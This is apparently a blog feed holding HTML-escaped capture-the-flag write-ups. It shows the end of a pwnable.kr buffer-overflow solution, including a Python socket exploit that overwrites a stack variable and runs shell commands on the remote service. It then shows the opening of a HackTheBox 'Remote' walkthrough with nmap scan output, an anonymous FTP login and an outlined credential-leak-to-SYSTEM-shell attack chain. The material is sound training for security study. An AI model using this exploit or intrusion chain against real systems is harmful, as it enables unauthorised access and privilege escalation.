&lt;p&gt;&lt;img src=&quot;../figs/bof3.png&quot; alt=&quot;first overflow&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;

&lt;p&gt;We need to pass a payload that not only overflows the stack, but overwrites &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt;. Since this is probably a little-endian system, our payload must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;A*52 + \xbe\xba\xfe\ca&lt;/code&gt;. Let’s test it locally:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof4.png&quot; alt=&quot;first attempt locally&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems that this payload did not work. After a bit of research, I realized that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt; function within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bof&lt;/code&gt; reads the provided input until a newline or EOF is encountered. As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; concludes its execution immediately after sending the payload, the pipe is closed, leading &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets()&lt;/code&gt; to encounter an EOF. This premature EOF potentially causes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./bof&lt;/code&gt; to proceed, triggering the stack smashing protection mechanism before the payload could effectively manipulate the program’s flow.&lt;/p&gt;

&lt;p&gt;To fix this, we need to ensure the pipe isn’t closed prematurely. We can achieve such feat by adding another cat command at the end:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof5.png&quot; alt=&quot;first attempt locally&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ok. since this works locally, let’s write a python script that will use sockets instead of this weird piping problem.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pwnable.kr&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xbe\xba\xfe\xca\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ls&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will make the system run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; and list its files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof6.png&quot; alt=&quot;first attempt remote&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great! It works!&lt;/p&gt;

&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;

&lt;p&gt;Now that we have an exploit and we know where the flag is, we just need to change the line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sock.send(b&apos;ls\n&apos;)&lt;/code&gt; in our Python script to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sock.send(b&apos;cat flag\n&apos;)&lt;/code&gt; and run again:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof7.png&quot; alt=&quot;first attempt remote&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there we have it!&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In this CTF, we were able to exploit a buffer overflow vulnerability by examining the source code, then the binary. Then, we found where in the stack the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;key&lt;/code&gt; variable was located and calculated the offset to overwrite it. A simple Python script did the job of retrieving the flag for us. Enjoy your newly dropped Smokie card. It was well deserved!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/bof.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 07 Jan 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//bof-pwnable</link>
        <link href="http://localhost:4000/bof-pwnable"/>
        <guid isPermaLink="true">http://localhost:4000/bof-pwnable</guid>
      </item>
    
      <item>
        <title>Remote - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;In this CTF, we are going to be exploiting an Windows system. Through a well done recon, we will be able to find disclosed credentials, get a reverse shell and then escalate our privileges inside the machine. You can access this machine &lt;a href=&quot;https://app.hackthebox.com/machines/234&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Let’s take a look at it!&lt;/p&gt;

&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;

&lt;p&gt;The challenge description is:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Machine Info&lt;/p&gt;

  &lt;p&gt;Remote is an easy difficulty Windows machine that features an Umbraco CMS installation. Credentials are found in a world-readable NFS share. Using these, an authenticated Umbraco CMS exploit is leveraged to gain a foothold. A vulnerable TeamViewer version is identified, from which we can gain a password. This password has been reused with the local administrator account. Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; with these credentials returns a SYSTEM shell.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The challenge basically gave us all routes to do a good research and thorough recon. We need to find the credentials to log into the Umbraco CMS, where we will have an exploit (probably a CVE) that should give us a shell. From there, we exploit another CVE, but now for TeamViewer, to get the aministrator password. Finally, we get the SYSTEM shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; from impacket.&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;Let’s separate this into:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;Escalating privileges&lt;/li&gt;
  &lt;li&gt;Flags&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;But first, let’s do our own recon as our step 1.&lt;/p&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#mindset-step0&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;The first thing we should do, is run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see what services and ports are open. We shall start with a simple nmap:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial /tmp/htb/ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; 10.129.229.68
&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Sat Jan  6 10:36:32 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A 10.129.229.68&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.229.68
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.29s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65519 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RPC &lt;span class=&quot;c&quot;&gt;#100005)&lt;/span&gt;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
TCP/IP fingerprint:
OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1/6%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;34700%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65992EB7
OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FB%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10E%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%SS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;U&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
OS:SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FB%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10E%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RD%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%SS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;U&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;O1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M
OS:53ANW8NNS%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANW8NNS%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53ANNS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%
OS:W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FF70&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FFFF%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53AN
OS:W8NNS%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T
OS:4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+
OS:%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y
OS:%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%
OS:RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;80%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Network Distance: 2 hops
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2024-01-06T13:40:44
|_  start_date: N/A
|_clock-skew: 3h01m32s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 587/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
1   258.93 ms 10.10.16.1
2   128.65 ms 10.129.229.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sat Jan  6 10:43:03 2024 -- 1 IP address (1 host up) scanned in 390.87 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From this, we can see some interesting information. Let’s address each one of them.&lt;/p&gt;

&lt;h3 id=&quot;port-21&quot;&gt;Port 21&lt;/h3&gt;

&lt;p&gt;Nmap showed us that FTP port 21 is open and anonymous login is enabled. Let’s take a look at it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaizen@celestial ~/CTFs/htb/machines/Remote &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.129.229.68
Connected to 10.129.229.68.
220 Microsoft FTP Service
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.229.68:kaizen&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous
331 Anonymous access allowed, send identity &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e-mail name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; as password.
Password: 
230 User logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is Windows_NT.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful.
125 Data connection already open&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Transfer starting.
226 Transfer complete.
ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;pwd
&lt;/span&gt;257 &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt; is current directory.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, there is nothing in the FTP filesystem.&lt;/p&gt;

&lt;h3 id=&quot;port-80&quot;&gt;Port 80&lt;/h3&gt;

&lt;p&gt;On port 80, we have the web service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/remote-htb1.png&quot; alt=&quot;Remote webservice homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon some clicks here and there, we end up at the login page:&lt;/p&gt;

